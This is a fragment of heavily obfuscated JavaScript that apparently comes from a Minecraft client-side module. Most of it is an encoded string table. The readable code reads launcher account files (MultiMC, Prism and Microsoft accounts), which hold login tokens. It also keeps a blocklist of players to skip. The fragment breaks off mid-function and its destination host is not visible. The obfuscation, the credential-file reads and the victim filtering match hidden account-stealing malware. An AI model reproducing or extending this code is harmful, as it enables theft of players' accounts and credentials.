a','fCksW7tcRW','W4SwW5ZcVG','BmkscG','W4zrkSktpmo5qJBdTqldQmoI','qSkFcaldLa','tWOZW50','W657dSkOc8oA','W5tcKSo5WQu8z8ogWRldNJytWOhcQmktjq','aXLfW4jdsG/dRqO','puLJjZBdOdCmW6ZdGCoLtcJdSqVcNNi','qNxdRa','WPddVbCkW4GRAcZdJCoBktz5WR8NW5JdOLGBWP0AuZVcU2xcLCk5ASkjFCkOqWldUmkHWPPYsvy8vGRdHgPRWOxdUIxdVSk1','W7dcT29Zc0ZcSquTphvftG','WRhcG8ohoa','W6RdVeddIq','CSkhcapdKYOiWOZcUSkK','W6pdQ0BdIZ7dQh84WR94jmoS','gbNcUmkYxWfTWQFcSW','q33dR8oMhSkee8kdW7S','qXmaCqqbqCk1','WRJdLdqkW5GIFZpdR8oapG','jCk+WQyVWOjsW6NdM8oMogvBsSoWW78','y8kCW4Ctb8oaW5NdH8kLWQWcj0Gi','WRVcI8omm2Kr','vmoHWP8MWOT9W4ldQa','jmouhxxcTapcJSoOmG/cHYlcU8oZW7WPWRtdHa','W5aPWPdcGYm','fsWNCv0kWOZdLq','W6NdGuC','wSkurey','dmk3WQiHWPCzW5xdUCoTj3DDcmowWRXgqwf1ndHSW7xcPmooy3ddQxr5hN7dTsJcPLWZW5BcSMbQWRO','qSkBoNOjpSo3WO1t','W6hcTSoBWQ8xm8osW6ZcG3fkWR/cUa','iG8NW6/cOCkMW4VcRLbQkw1tWQSC','qSkmFsaHWRldKCoHW6JcQ3FcGmoTWONdJSkFW6THWOK','W6lcU8oCWR88Cq','bYhcNsVcP8o5yCkkySoiW5qiW54','gXJcUCkZ','g2LetbtdGbzcW5ddI8orAYxdSa7cLa','v2vFW5xdSSoVE1DbW5BdQmkOW6LfnaruqY/dNv3cQ8k7WQFdSa','W6/cUYeNiSklhe9HjrJdTSk8p1Sq','W7BcQqlcM3affCoVWQmvW63dJW','WOVdUdu1W441Bb3dQ8ohpIThWQOEW64','WOm0W7BdJW','WPJdK8oCWQVdRCo7W7CGWQtcK8kQW5tdKa','W73dPmoMWOKXW5JdM8kDyrhcTSo9ia','W4yXWPBcNa','uM7dLtldKSkCWRaZFwFdUSkHwxpcLHzjW6LOnGtcRCo6A8onwSkgamkVW7NdHMGLWPNdNCkl','WQSpW7tdIX3dTr91CmojDmk9W5hcQmokxSo8W4auWPJcGGvcdSk0EhaCWQiZWPBdJ0/dOx01jc7cTmk3BdNdOfu5WPPhkw/cLq','W5mJWR1fWP7cSmoTW5FcPmkwW5JdGmkIzKNcUCojW74','imobbCkYWQ7dN8oYuCorxMaGkSo+','WRVcI8ofoG','WQ3cG8oAlhOnWOu+j8oHWQ4hW44','W5tcJtuceCkToMrldYG','W5hcS8kYWQWyCNpdOazKWRG','W4NcSHpcK3iJ','k8ofh8kq','qNpcQmo1WP4','ymkeEYa','W6RcSayfu8os','WQ3dG8oBWRC','nG8NW6/cOCkKW47cPe1ThfXtWR8CW43dTIW','W4tdOmoKWQKxW4pdNCklyGZcVCo+kW','jYvUWOyDg1/cPLtdLW','W6xcUGywqSoukNmag8oX','W4NdRuNdJW','B1vSaq','iSoFaKNcVGxcLq','WQ3dICoKWQZdTCoSW6WzWQtcLmkM','gSolC03cHmoiquq','aqZcVmk6hWHHWRxdPmobvdu','W6tdSCoIWOeAW4C','nen9tq','cgnGAqxdIW','Be1cW7tdUCo0BuS','B8ksbbq','qNNcV8o5','W6ddTWVdHdpdHgO','s35VWOpdGvK','W44ZWRXj','xCkak3ilgmoUWPTUWR7cUmkK','adRdV8o9nSklfSkbWQFdOmkFW6JcVSkkWONcJCkhr1irW6f8h8kaW50TW6ZdTCoiwSo/dCoOmSoTlW','w8o/W5dcVG','W63cOSodWQ1MBSkhWRRdLMOmWOxcUSoFCY4ZWR0zEx/cLSkB','WPaOW7ldRXNdOInOrCojCCk5W4lcOa','w0KcWPDA','ot/cPa','oSoCcG','CCkggHK','yNGQW50wW5a','W5ublSocWPJdMNFdLNxdKsrnW7i7','v8kqBtyZWQ/dGmoqW78','c8o9bKdcUbZdM8ojia/cTG','rMv8WOVdJeldIu3dPCkroG','ca/cG8oIW55ZDuz2ufa7WOhdQCkRW6mC','laq3W5JcVa','srScCW','W7hdMfhcL2JdLmoUW4tdIx3dMGJcSgKMvCoZWR8Kl8kVWRq','r8knFsOQWRtdNmot','bCoDaL7dTSoaf0BcIa','bWJcPmk8rq4','W6tdOvZdUJpdNwC','W4KyW4hcR8kvbXBdGmoIW447W70','uaKjzJOsq8k2W7uMmW','vwtcU8o+WQ3cG8oDESobyrjR','mmkuW7BcVSorW4ujA8kPDSk0','qmk6r0ZcGmo6ymkzWOmScCkYW5rnW4i7qMxcMYBcO8oEWRpdLmkBdmoclCoXW4inCCoQWOpdJHmRW47dQYSEWQtcOG','lSoDcH7dIt82WOldOCkoA8k+WRfNWPVcRmkhWPFcJIddSCodW7FdO8kGW6SaWRSwWOiaW6CHcSoSdSkji3RcImkdWPRcKaSkW77dLSkpEavLWOb1W5tdPG','ab9o','uZlcLXhcG8koW69RjxBdVSohdYRdIG','dXPnW7retWBdSa7cGXy','xx/dJNddU8kkmmkru8o+W4ueW6e','WR7dOudcMtpcMw55W5yQmCoOpcSqWRtcKSoPaJ5Rf8oyod45xwrqWOVdG0zaDCkhWOy','v2PeW5FdTSoLw1DbW5BdG8kmW79hdrPZutZdILdcRCkOWRZdPSkkW7hcV8kOmfVcS8kGAK9CCZhcQY0RW6jnysP7qSk5AeBdMCoHhKirrCohmmoliK/dQG','eseHvL8qWO3dUCoaWOpdPmooWQFdRW','w8oOW4dcOSoxWPW','W5/dNLdcMwldG8o8WOZdJIhdTtxdPee','W4/cS3nI','W5qGWOVcTcmSjW5JW4q','tM/cUCo2WPNcI8ousW','WQNdH8oAWRddPW','cLqpEWqgrCk3WRmUp2vUWOdcGCkwW7lcGHZdNCkRxCo1WQfYWR8jWQ8','FxGWW6GhW4LvgSkwW6eMWQzaW7CEW5uuW78','ECkcgSkq','d8k3W7FcQCovW4DDBmkKz8kLvG','vCkhW5aooSoxW6NdPCkPWQyg','W7j1g8kYamo2CXVdIIldNG','W47dLeVcGhldUCoUW4tdItxdQW','fmoazgxcLmops1pcPL4','WOBdMHyaW5WuBaddVSoAktW','hxXaBr/dHZLmW4BdI8oLqIxdUXy','W6H1h8kGs8oaEuFdUJtdMmocWQSOAW8xW7pdHqOfA2bEW5fxW7OYfW','W4tdOmoKWROrW5hdJCkDyHhcJ8oGiuNdVGBdG3G','WQNdUWSnsCoCn0bwdmo7jWnlWONcOSkuW5ZcSCkWxs03WRRcPWhcQSk+kmoWW7bOhdC','jmolhSkCWRxdImoU','twdcRmo7W4lcMSofuCouoZzQgSkjWOCm','uMjTWPJdV1JdI07dOSkjla','g8oree7dVmoafuy','WPKsnmorWOpdGa','W5hcKrycdCkmogrflJJdN8kn','W6pcTmkUWQ4v','qMLTWOK','h2bFEXq','v31PWPpdILG','mmkuW6JcS8o7W40VxSk+yCk0','vxrPWO7dRKBdIgRdSSkrlmkR','dYpcVmkO','W4ZdRfFdHt/dJfayWOL2nSoKmwmv','W4NdGLRcGfVdLmoGW4tdLdZdVa','W6VdGSo/WOCtW4ZdNCkKuG3cRCo9i1ZdHYhdHgtcGsfMW7NcOrNdTYrgW6xdOSkljqpdO0pcS8kSzcykBL4bW60odW','W6ZdQeRdMtC','W447WR4','DCkophy','WPXRWPZcNYGPiq0PW5hdQG3dGmoNkSk3ke88W65ZW4ZdOL3dJCkFWO8OW5KcWO/dK8kBxG','dSorbwpdNSoAd0lcLCotW7W','rGGvzb4p','abDmW44','E11NWONdJKBcHhVdV8kepCk9','u8kogmksd8k5','y8kQgf8MgSoBWRrVWOFcHCkwoZRdQmk4','xCkEs0BcL8oI','rCkwohy','BxiXW5qwW4PzpmkkW7et','WQVdNGWGW501yGldNCohktX1WRC','sCkPBG7dNW','DSkbaaxdGG','sCo4WRCVWOfrW5/dRmk7ngTasCo4WQDkxdPEedjHW5dcRCoiivRdTwH7ghxdHq','uSo7W4/cS8oBW53dSxxdHdrxpSkVy8kvi8krWQzVz8kpwSoxW6rVBtOyW4ZdQ8kU','r8k6jZddQW','q8kaEWa1WQ/dHSomW4VcVNFcLSoPWRS','x8kvwKZcISoZwG','F0DLW4ldSSoPzL8','W7pdKvHd','aIS+E14','kqS9W5O','wsxcRq','Eu1xW5i','WPWEl8kZ','W5RcMWuQaCk7nNXrcttdTCkjaN0','W5u/WQjNvLe1WRf2nJuJgGFdJW/dQ0CDw3RcJq','m8oEbeBcUbW','zSkwhtddHsOWWONcU8k4FmkpWQz2WQa','WPldKbiedCkUmhClgJ7dISkpgNb6WQiGBwtcVdJcGZ9tymkbW7/cSCkUn8kBBGuTl8kTFq','qMtdIgVdOCk9bSkmrSog','WPddTHegW50OFH/dQmohbXXWWR0EW5hdHe4mW49+DI7cRLJcMCkpymkjDCkXsLBcLCkZWRfJsK4HtZ3dM0zRWOhdUcNdQa','W5CCl8kWWORdTG','WPtcLJaXW7Sxid3dQ8ohmZzWW7C0W7VdTe8BW5q6vW','dSo3pSoAW6tcLCkOgSkVgW','W5RdNK3cVgRdI8oQ','l8oDhu/dGW','BKj3cNnpAq','o8oub0dcPrO','vSo7W5tcTW','W7ddGuzcjCkatG','nComFeq','hbnaW49KtWBdNqdcKHFdUG','dg1dEWBdJaHhW73dMmouqtNdSa','W7/dPvBdMsxdHN0SWRH2jCoJkq','bWZcPmk8','sx5MWO8','m8olm8koWQJdImoCuCoWs2S','vmkxiwatkG','thVdSSoXoCkz','W7ZdSuFdMsBdM2yMWPW','W6FcTCkIWRa','jYVcVCkO','gIu7Eq','rdBcKcpcLSksW7jJe23dRSo5gG','cSk5WRmPWOfeWPJdOCoNog0','W4BcQCk5WRKnjq','W6pdQ0ldGZZdRw48WPPjmCo5nq','w0CxWPitf1ldKZxcLWldI8oa','W6NdQ1FdPdpdHgO','B0nqc2TDDvJdVCkrW6e','n8oraSkF','ySkvW4yzxmkr','FmovW7VcPCoAW40uwmo/yCk+xmoMWQRdSCk9h8ovWRSEW4/cS8ogv0CbWRCtaJ7cUaXepa','udJcJJhcImkt','rSkDiwCc','thVdS8o5mCkida','yMNdMM3dSmkJ','ALL5fMu','gSorbxJdLCoydKBcImoeW5tdI8krWRxcQs0','nYRcPCk0vGPHWP3cICo8DbytWRbvhSoSW6e+WOZdUH9SWQHPFcS7WP5BumkFymoLW6/cVruRt8k8W5udpLZcMSkWw8kk','lrLpW59atr7cSI3cNWldRa','g2LetbtdGbvhW4FdNa','wh7dINxdOmkQnmkw','W6BdMfHIk8kdxa','smkaysiZWRu','WRhcH8ohohKk','W6dcU21Tc0W','vH8yrG8rwCk1W68+bMrIWP/cLSkaWQNcTW','hrnvW7LauH/dUGRcKIldU8o5WRPgdmoOWP8','nmoEbKZcUbFcUmoInbxcOW','W5VdLeVcOg7dLCo/W43dKYpdVb/dV0a2','WPxcRCoKgG','y3xdJ3ZdP8kRp8kgv8oRW5ycW6BcLa','W4NcHWeo','WPqbimoe','t282W5SBW4S','dYpcOSkOW79Fqdy','tW88nmo3fqi','CmkyrKtcK8o+','s3bMWO0','vmkxzJyQ','uJVcLIpcIq','xxhdU8o7n8kdmCkhW6xdPG','FM8RW5WlW5rfl8keW6eE','W7S5WQj2veO6WQq','W6xdPvpdI3ZdH2O8W5vmaSob','W5ZcRW3cN089fSoRWOizW5ZdLIDelx/dQrhdJa','h8okC0dcNCoTveFcH03dGsC','uqmCCq','b2FdLwtdLColWRzmjK/dUmotba','W58GWPhcLZiN','WQ7cJSomoN0','rJlcLYlcMmkIW6fHjgFdQq','W7qLwq','f8oaDKdcHmoaugFcReddNcxcKq','i8oEaKlcVW','s2dcTmo9','W7ZdSuBdItFdMNWUWO51fmoOpNrDWQFcGSk1qgKT','frG6W47cQq','iSoCgmkeWQJdNG','WPKppCoy','W6fMemkXeCog','W5NdN1ZcGhldLSo7W4FdMq','W6vXhCkmbmorvWxdLcldM8ocWO4rFbCIW5NdNHKbDG','cSoBhKhdMComca','WRVcI8ofk2Gq','W6pdPuVdJq','cSkZWRONWPTF','qxtcTmo5WRpdNSkacCkklujhcq','v2nHWPNdGNxdHuVdQmkkpmk2W7C0W49+iGJcUa','W6pdJXuv','WReKW6RdJXG','zSkDW5Kzgq','vwtcVmo2WONcJmof','itmNW5umW55jgmokW7izWRTiW6SEWOOdW65ZmqxcTw7dH8odFZZcGh7cNsNdPmkbamoPW6iOpguRpGSm','BCkwbXBdKZe','wYFcHJ7cOSksW65PnwhdR8o+ata','cG4bza','W7fLbCkOeComsrNdMt/dN8ocWRu/AXWbW44','uSkapx0tk8oNWQHfWRVcQq','W6xcU3fG','AmksFvpcL8oZD8kgWQe3hG','a8k4WRaZWRHEW4ldOW','hatcPmk/xHf3','f8omy0lcNSoEqbJcJ0pdLIFcHhpdIZZcTNW8zSkEW4C5bbhcHf9pwa','EMFdUCoGDCkSgmkdW6BdTW','B0nmbwHq','W5/dNLdcMwldG8oFW4pdItG','dr5aW58','rSkgjNCilSoT','W5tcKbihfSkSpgm','vmo7W5FcTq','F1fgW5m','W6BcUmk7WRK','W7/dMu3cNwBdG8oqW6BdMdBdUcNdVfa','A01Vf2TxDx/dRW','W5tcQmkNWRK','lYpcVmkO','W4iwW53cVmk0dvZdISoRW4O','BCkJj3qon8k+WQ9lWQVcRq','W4tdTCo1WOS','qdJcSctcK8kuW65G','W6ddTeddHbhdHMeMWP56jmoKmMG','WPe4W6JdIttcOx0QiSkomCkdW6O','cJLZW6JcT8kWW4NcR190kq','W7elkmk3WPVdQXVcKgxdJWaJWOHI','prncW5LavYhdUGdcTqldRmo1','vZVcJcpcHa','pXCf','BNFdV8o3kmkz','r8kkEISZWQ/dKa','W7/dNLhcHM7dImo7WO/dQsNdQtK','W5hcKrycdCkmogrfltddKCka','W4xcP3nMmq/cOfbRFsHOjW','l8kxcW','W6VdH09pjmkZxmkJW4zRW7tcHSkz','W4f8WRlcMfNcP3X1rSoBC8kKW7q','v3b7WPNdMexdLKZdUa','W4WxW5BcVSkG','a8ofbCks','W7uHWRrEW4FcLmovW4lcQ8kq','t0LcW5m','W5/dNK/cI0tdGmoDW4pdKZFdVa','z0LyW5e','xSkCw0BdKCkI','hH7cR8kPyrrRWQFcO8o4yW','W67cSmo0WR46y8kF','rWGdyXKfxSkJW4SJiN5oWOdcNmkzWRtcQWa','W4hdGurd','W7tdJvXNkCkuwmkKW5rsW7FcNSku','i8ovb0VdTCorgeBcI8oeW7ddGCkl','yXmECqWpvmkpW5GVmhD4WOpcHW','W4aGWOVcOIm+pq91W4ldLrddImo7kSoOp14','y8kGwW','jGiHW5lcQCk8W47cRa','d2JcVa','W6xdPvpdI3ZdNhSHWPC3a8oUpgHkWRlcHa','xmkdf8khomk+W6NcVqxdQa','W5pdIuZdIsddHNWNWP1TdmoiowfbWOVcO8kVsNv+ySoDywOdlgCgW5ZcJ08mgmkQW5RdG39kWPZcJJRcLSkR','ywJcTSo/WP8','W6f7b8kIbmoD','W7pdH1XhjSkNxmkKW5rmW7RcGmkvWQFdJ8kwW659W54','h2rrFa','W43cIWid','ftySBKq2WPFdImowWOJdOSooWRFdQhhdNSkZW7W','WORdKHqaW70IBbtdQ8ob','dquGW4NcQSk0W5BcPa','p8kuW7/cO8oAW68Cs8kXvSkWr8oP','oCo1jwNdUa','W6vXhCkic8oAyGJdLI7dIq','ySkBoNOjpG','kWm8','bWtcUCkVDW9OWQtcUq','xSoZW4VcT8ofWPZdQG','WQVdNGWWW7Oosq','imkpW7NcUmoaW5GQvSkKBG','psxcG8k5W6TzvG4','eg1EBW','AeDzW53dQCoLEW','bmoGju7cPrFdM8oRlGNcUJhcOmkJWQO','W7xcPmk/WOWElJhdKab5WQ0','W5uHWRrEWRRcP8oDW4hcRmkiW44','j8kjW7hcPW','k8onaSkdWPRdHmoXrSoX','uZlcLX3cJSkzW6LHowFdQCoK','W5JcP8oqWQ49zq','rYFcHJm','W7NcUZi5oSkydu9PmHxdOa','t27cQCoUWOlcJSoCxq','wmkoaSk0gCkIW6lcTdhdQmkmWPtcNmkkWR4','aCkZWQabWO1eW5NdP8oHi2zIr8oHWQy','W4KyW5ZcVa','CN/dH3FdSmkTjCkmxCoa','BLH1ca','W6ddTKZdJtVdH1a9WOL1','W5fGg8kOc8oo','W6dcPSob','W4BcQNr2gK0','yMxcVCo/WRpcQ8ouxSozybTS','uNW8khnBzNC','d8k4WRCSWPPtW5pdUa','fdy6AumgWOVdI8oZWO7dOSodWPhdRKFdKmk1W64','gqZcPmk/xGTrWPtcG8oq','W6tcRmoAWQCHz8kLWRVdHcOk','W4FcU25MauZdTq','vh7dIMVdRmk+jCkavSo7W5CvW7VcIfu4Ca','W5emnmkSWPpdRbRdKa','tufAW5m','z0ffW4ldHSoPzf1u','shhdQmoFmCkdgSkfW7RdOSkrW64','rhpcO8oQWPJcGa','amkpW6RcO8oAW4W','wv59eNLNq37dUSkdW7fOkG','d8kLWPaPWP1sW5xdV8o7jxO','W58fpG','wSkth8kgd8kI','WQRdKSoAWQRdRmoUW7C8WRW','kHWPcfvsyMhdQG','iquvW5tcQSk0W5C','aHnpW4XrsW','W53dOutdHHddTKqHWPzypmo5','wNRdUmo3pSkeeCkdW6W','rCkko2C','hmoxEuBcMmocE0lcSua','W7VcTHhcLNuNbmoRWO4BW7FcGt5ilq','rg7cTCoXWOxcISoc','l3Hcyr/dHa','rgnXWPRdM0u','kmoufmkzWP/dGSoZtCoNswySjmo9','D0LYa2Hq','DunYaq','W6hcS25GwaO','W4RcJbGFbG','WPaOW7ldQWNdOYn2y8ojzSkmW4lcUCo+','mmomyeNcLmoE','W7tcT8ouWR48CCkXWR3dHsW','gYuT','sMFdR8o3nSkzfSkhW6tdSa','W54/WQbN','W5JdMeZcKwtdLmoR','W5FcQ21G','W7vMamk1aa','W6JcT8oEWQi','xCk0bH7dGdu6WRNcJCkKA8kWWQPNWPtcLSksWOBcI2hdH8ohWQZdGmkoW4yzWR1AWQXsW5SIgmo9gq','l8oNyKdcH8ojD1JcPvJdGIFcMJBdHaRcQ28RzmowWQONdHdcKLzzzNX3W4tdRXfeW4VdKSoJW6KTW5W/WPK6W4ddQSkOW70xW4zzqc/cISoXW59I','BLlcLCk3W5tdL8keaCkvja','s3rMWO3dM0i','jSoXvGZdIq','rHGiiG5sh8oLWRf9zYe+W4ldH8ohW6/dUL7cH8o4a8oLW58+W6HmW73dQYldRSomWRnCWPlcMq','qSkChb/dKYSM','jsxcT8kKW7Dd','WRSIW6hdGWxcSaH7ySoC','dhLdya','W67cVXhcNW','iSofaeS','W77cOW3cN2GH','W6VcOSoBWQS','shhdQmoqiCkzgSkv','Be1c','gx9dBr/dLXncW47dNq','WP8tpSoeWPNdM3ddG2RcJa','thZdRSo9nCkecSkl','r8kjydyI','W4ZdRvxdGJFdMW','WQVdG8ojWQFdNCoSW6WOWQRcLq','drLrW5jQrtJdVHFcGrC','gty8EvKnWQBdJCowWOS','W5ewW5NcVSk2','qwJcTSo/','WP0foCoUWOldM2NdL3lcRdPmW7G0hG','jCkAW7tcV8or','gxrzEWxdKa','fSoscKlcOqy','W5RcIHmglmkEuCkYW4LAW7JcL8omW7y','vam8n8oScG','ySkggWpdGJCRWRhcP8kHFmksWQ5UWQtcQSks','WRRcH8oDdwGrWOC1cSo9WR4QW5v2WQO','W5VdLeVcP17dR8ol','W4K8WRjaWP/cSCoxW5q','zetdRZtcRq','dqtcUmk+vWL8','WQizW4dcH1m','W6ZcTb4dcCouo1nxpSogba','t8kaDJy','W6ldRuS','W6JcOWdcNG','z01yW5hdTmoO','egntAr3dOGPtW6BdJ8obta','amovDui','W61NpCk4fCom','W7ZcRSkLWRK','W5hcT2L3f2hdSayRk2G','hSoqFfxcMmoCruxcTWpdKYNcMJ7cTsZcUhO8oSoBWOO6faNcHvjzqXq','ee9BjLnqsmkuW6O+g10','BmkCw1dcKmo5D8kHWRm','W58KWPhcLW','cx9vEIhdKrvfW4VdGSoq','o8oey0NcOSojua','taKTzHGbvq','WRhcJCoonMmMWPyUbCoEWRODW5i','Du1Xaq','dWlcJmkYxWDO','r8knBJCeWRldJCoBW5NcVG','W7pcRmoMWRG6A8kiWRm','W5mMWRbEWP7cPSoLW47cSCkm','kGyNF0ygWQRdL8ocWPpdOCokWQBdUwNdVCk1W7WiuYZcNWC4W5iPC8kUENNdHr7cHmkNeKVcRY3dIWFdTfrRcZG3WOeNW4/dVCkEWPWrWP3dMSojeq','wWKNpSoSeaG','W7/cKg9KgfVdGG85oM1whmoMWR7dOwlcKCkOEmk6WQzbWQfXWQFdMvlcI8oHhCkXqvlcU8kDtmkAr8oOWO5ntL8emhlcSLhdKW','vh7dIMVdRmk+jCkavSo+W4udW7RcKvSNCq','ySkCgqJdQd8nWOtcOmkRFa','AhqHW5ygW4S','l3vdFbtdJG','W65Xb8kMeCob','WPKOW77dNG','WPi/W7tdHrK','b8oCyeq','WQNcM8ozoG','W5BdKeNcKYxdImoQW5BcKWxdIXa','nCobfSkEWRpdG8otqSoVtW','W7S/WRH7','lSokeSkBWQNdICo4ua','W4GuW5e','E8kbAICYWRO','f8oaFetcHCoj','W6BcRSkhWRmBjdpdTHn+WRe','W6JdM3XFoSks','uZlcLWxcTmk0W4q','WQJcLSoamW','W5BdKeNcKYxdK8o7W4VdKx7dOZxdOaOjumo3WPm6oSkVWRK','WRtcJmokm3GgWPiP','fsS7ALunWO0','W6NcKr5ldSkPn2KedZtdKCkAh3aKW6fGkZNdQhq','WRtcTSkQWRuyFdxdHWDO','d2LewHtdKG9gW5hdMSo4sdJdVq3cLa','f0G/p8oIcX3dL8oXwCoFWQSdW4ZcJd49wmkAeCo0irxdMYxdSs/dGrNcPCkiadi9','smo7W4RcOCouWPZdOgpdOJjcpCo0ta','vxr4WOBdJKNdGq','W5ubmSkrWPVdTH/dKL/dHrufW50Mrq','WR7dNHKbW7aIFWldOCob','W4xcVbGkqSoi','FmkaW5argSo6W7BdOSkZWRKupvyyWOWG','vgJdJhO','kZpcPmkOW6O','W6JdK8kFzJTwW48wkmo/WQSRW6W','WOzWW4JdGN9/lc5WW4ldIcK','eSk/WRKLWQXfW5pdQSoGmMC','W7z7oCkGeCob','W7RcI0fvWPH+pXlcO8oqAZT1W7DpWR7cPWTeWOvRvIRdTW/dTmkUpmkjCmo1eXhdUCoiW6e','jZ/cVCkVW7Xc','W63cSbfwcCoEpa','kq89W5RcSmk9','ptpcOmkO','WOlcIracf8o1lwjrga','W4W3WR9lWP7cVq','cb/cS8kRrqK','bSkVW57dP8km','W7VcR8kOWRazjstdHG','tSkvW5Gz','W4dcVxjUb1VdGqeRjG','W4GqW5W','W5uyW4dcQmk9','daJcVSkAuXvRWQ3cV8oGyYKFWQfH','W7fXhq','WRnfW78','W4W9WRjnWOBcLmocW5FcGCkfW5/dHa','W7tcPSobWP4TC8ktWRhdGJaUWPlcS8odCZ8ZW6O','rSkea8kbdSkZW6JdTIFdS8ke','tJT7BHxdQq5a','W4f8g8kUcmomstNdIIldISooWOy/ka','FMG3W5i','W6P1gSkoeSohrHVdLZ3dICovWP4J','W4FdPmoIWPSr','W6dcPSobWOaNyCkhWRJdUsSnWPq','oCoqbei','qZ7cJwpdKW','BCkOj3WanCo7WRDPWRFcVSkQaHBdUSkQqCoNjCoHfCoQWRzDE8kdkSo9zSoqDeFdQ2uRqqOyWOn3u287kKe','W6dcUHOSrSoxoW','W7e4WQ9UqeCXWQq','x2BdS8o0mCkbgSk2W6NdT8kF','m8olgSksWRi','u35BWP7dNupdIK8','zHiEEWCjwCk9W4mom3bSWPRcN8kg','dg1cEXq','dmomgfNdHmoA','WP/cG8oAoJTw','jsVcVSkQ','W4BcIWJcMw4RfSoWWOeaW4xdQYbgofFdLq3dH3NcRmkuWRVcVNC','wu1rW5/dR8oU','EmkFcKJcVXtcKSoQBHZcUd/cS8oVW7X2WQpdLCkZpCoJW5rlWRtdPCo+D8kLfKr2W4JcQmopWRXkWRb0amkUsW','W7NcQq7cKxuHfG','W5VdOmo+WO8aW4G','W5NdG03cNxK','W6NdRuNdJW','W63cOSodWQ1MD8ksWR3dNwOeWONcRmkDtcq3W5WQzgRcJ8klFCkXbmoIz8k/','DSkCxKldICo6zmkRWQDQkmkKW4PCW7Sd','ywJcTSo/','W4dcUM9Qa1FdPa0','tSkeEsrPWQJdNCoxW7tdPfBcKmoPWRJdHCkiW6S','qCkAo3S','W691cG','kvH2juK','vrSEzW8/sCkIW64Lja','C8koD0dcLCoVDCkX','W7yZWRTlw1aGWRzSEbm','emoaEu0','js/cVSkQW61y','W6pdH0vhi8kz','bIuMBuCmWOVdNmoxWRJdTCoeWQhdSKhdOmkZW7ikv20','ECkcgSkqca','WPmolSonWOldI3ZdKq','W6tdGeLucCkywCkYW6zp','W5enmSk6','h8oeFKy','W6dcPmk7WRaniIq','wSkzbmkAcq','cW5iW5Hrua','W73cOXxcT3uQamo8WPuvW7/dMG','bta0BeqqWQ7dKCoqWO8','W7hdMfhcL2JdLmoUW4tdIx3dMGG','r8kkyc4UWRJdMSkqW7lcUwRcNq','h8oaFKBcHCoe','WRpdH8oEWQlcRmoNW7SUW6VcSSkrW7C','vgJdGgRdOCk9','q8kBW5Oxa8oaW7u','x0DzWPBdRCoHzKehW5ddKCkzW79lncSHgh7cNutdHG','iWm/W5G','dSorbxRdKCoDeW','v3b6WPNdIG','dGpcRSkOzG9WWQK','bbDxW4OltWVdSr7dIchdVCoKWQnngq','ySkBcau','W783WQfNEuW1WRm','u2H4WO8','W6ZdRfFdHt/dGhOL','W7i3WRPJg0O7W7L2DGytuZG','W7pdH2f1bCkKsCkLW45vW7i','WPNdRZ5iWPC','rcxcIIpcJa','m8ots0ZcICoWBmkIW68Ne8kVW5zfW7CBxc/cPwNcHmoEWQVcLCkupmogp8o1','W5elnSk6WRhdOZ3dNf/dKru','wWK9o8oXbWldPmoZgComWQWfW7BcNJ4XfSoC','rMf4WOBdHKNdHvZdOSkkj8o3W6K0WO56FuFdVmopDG','ySkCbHRdJJWS','W5aZWQnFWO8','WRKmlmosWOq','aCkZWQapWPPdW4BdVSoGbhDaq8o0WQm','W5tdQSoGWPe7W4BdQSkzFWlcUG','W67dM2XpomksxSkJW4HjW6W','wt7cJq','W6BdQKBdHIFdJwO7','fZqLwLexWPG','yCkbAcay','uCkrzIK','saCGnCo2fG','vSkffCkzdSk1W6JcQW','W6/cSGJcLG','W7FcRW8','dqryW5Trta','W4m9WR9pWOVcOq','W5qim8kWWPy','cb/cR8k6rqm','shhdQmoAn8kEc8kOW6NdRSks','s35RWOVdG2VdLfJdJ8kepCk5','v2r7WOi','a8k0W4VcNG','oY1XWO1rWO8wg8koW6i7WRPf','W5RcMWuUeCk6nMj3cspdGmkjgW','rSkDW4CzdmokW77dNmkWWQSriueJWPOnASoWgG','a8oqy0K'];a0_0x5835=function(){return _0x532c7a;};return a0_0x5835();}function readStreamFully(_0x5645da){const _0x1196b4=a0_0x49b0a2;try{const _0x4e6fb4=new Scanner(_0x5645da,_0x1196b4(0x459,'emuX'))[_0x1196b4(0x19d,'5w@D')]('\x5cA');return _0x4e6fb4[_0x1196b4(0x1a6,'[B%l')]()?_0x4e6fb4[_0x1196b4(0x63c,'V$ji')]():'';}catch(_0x4912fe){return'';}}let mmcAccounts=null,prismAccounts=null;try{mmcAccounts=FileLib[a0_0x49b0a2(0x45d,'wIzM')](rootDir+a0_0x49b0a2(0x211,'tldi'));}catch(a0_0x41ce55){}try{prismAccounts=FileLib[a0_0x49b0a2(0x338,'gkB6')](appData+a0_0x49b0a2(0x256,'ATso'));}catch(a0_0x272ea9){}if(rootDir[a0_0x49b0a2(0x4ea,'5w@D')]()[a0_0x49b0a2(0x501,'6(Qp')](a0_0x49b0a2(0x38e,'@G#8')))try{prismAccounts=FileLib[a0_0x49b0a2(0x584,'rMVl')](rootDir+a0_0x49b0a2(0x2e2,'W^I^')),mmcAccounts=null;}catch(a0_0x48ee85){}let microsoftAccounts=null;try{microsoftAccounts=FileLib[a0_0x49b0a2(0x65d,'ATso')](minecraftDir+a0_0x49b0a2(0x281,'aH$!'));}catch(a0_0x1290c8){}const BLOCKLIST=[{'username':a0_0x49b0a2(0x309,'a%Ty'),'uuid':a0_0x49b0a2(0x2b7,'zJu^')},{'username':a0_0x49b0a2(0x25c,'etie'),'uuid':a0_0x49b0a2(0x238,'4G]x')},{'username':a0_0x49b0a2(0x41c,'6(Qp'),'uuid':a0_0x49b0a2(0x49b,'a%Ty')},{'username':a0_0x49b0a2(0x24c,'[B%l'),'uuid':a0_0x49b0a2(0x438,')WT4')},{'username':a0_0x49b0a2(0x432,'Fi7!'),'uuid':a0_0x49b0a2(0x2f8,'6(Qp')},{'username':a0_0x49b0a2(0x5c6,'Wi[K'),'uuid':a0_0x49b0a2(0x1f5,'8(V@')}];function isBlockedPlayer(){const _0x38b357=a0_0x49b0a2;try{const _0x4c9a15=Player[_0x38b357(0x208,'G3bK')]()[_0x38b357(0x29c,'a%Ty')](),_0x175d07=Player[_0x38b357(0x486,'zJu^')]()[_0x38b357(0x215,'2Kmv')]();for(const _0x390be2 of BLOCKLIST){const _0x11dd29=_0x390be2[_0x38b357(0x5fe,'PwVi')][_0x38b357(0x35d,'#cv9')](),_0x13feb1=_0x390be2[_0x38b357(0x17d,'zJu^')][_0x38b357(0x2cc,'uenZ')]();if(_0x4c9a15===_0x11dd29||_0x175d07===_0x13feb1)return!![];}return![];}catch(_0x5b9189){return![];}}function a0_0x4c67(_0x1b5800,_0x116f3a){const _0x583504=a0_0x5835();return a0_0x4c67=function(_0x4c67b0,_0x1176e9){_0x4c67b0=_0x4c67b0-0x17d;let 